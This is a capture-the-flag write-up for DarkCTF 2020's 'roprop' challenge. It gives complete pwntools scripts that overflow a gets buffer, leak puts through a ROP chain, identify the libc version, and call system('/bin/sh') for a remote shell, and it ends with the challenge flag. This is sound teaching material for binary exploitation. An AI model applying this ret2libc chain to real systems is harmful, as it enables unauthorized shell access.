# DarkCTF2020:roprop (pwn,313 pts)

### Challenge:

>  We given a 64 bit ELF binary , and we need to do get the shell using gets func and ROPs .
>  We are not given Libc (which is used by server).we also need to find that one

Its a simple ret2libc 

**Exploit plan:**
```
1. Leak the puts_got address using puts_plt 
2. Getting libc from the puts_leak
3. Getting shell 

```
### Leaking puts

```python
from pwn import *

context.arch='amd64'

elf = ELF('./roprop')

p = remote('roprop.darkarmy.xyz',5002)

buf = 'A'*88

rop = ROP('roprop')

puts_plt = elf.plt['puts']

main = elf.symbols['main']

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

ret = (rop.find_gadget(['ret']))[0]

puts_got = elf.got['puts']

paylaod1 = buf 
paylaod1 += p64(pop_rdi) 
paylaod1 += p64(puts_got)
paylaod1 += p64(puts_plt)
paylaod1 += p64(main)

p.sendline(paylaod1)

p.recv()

l = p.recv()[49:56]

puts_leak = u64(l.strip().ljust(8, "\x00"))

print(hex(puts_leak))
```

We get the puts leak.

### Getting Libc

After getting the address of puts we should search on libc database [website](https://libc.blukat.me/) for the correct libc version that the server is using, download that.

### Exploit

```python


from pwn import *

context.arch='amd64'

elf = ELF('./roprop')

libc = ELF('./libc6_2.27-3ubuntu1.2_amd64.so')

# p = process(elf.path)

p = remote('roprop.darkarmy.xyz',5002)

buf = 'A'*88

rop = ROP('roprop')

puts_plt = elf.plt['puts']

main = elf.symbols['main']

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

ret = (rop.find_gadget(['ret']))[0]

puts_got = elf.got['puts']

paylaod1 = buf 
paylaod1 += p64(pop_rdi) 
paylaod1 += p64(puts_got)
paylaod1 += p64(puts_plt)
paylaod1 += p64(main)

p.sendline(paylaod1)

p.recv()

l = p.recv()[49:56]

puts_leak = u64(l.strip().ljust(8, "\x00"))

libc.address = puts_leak - libc.symbols['puts']

print(hex(puts_leak))

binsh = next(libc.search("/bin/sh"))

system = libc.sym["system"]

exit = libc.sym["exit"]

payload2 = buf
payload2 += p64(ret) 
payload2 += p64(pop_rdi) 
payload2 += p64(binsh)  
payload2 += p64(system) 
payload2 += p64(exit)

p.clean()
p.sendline(payload2)
p.interactive()
```

**Flag: darkCTF{y0u_r0p_r0p_4nd_w0n}**
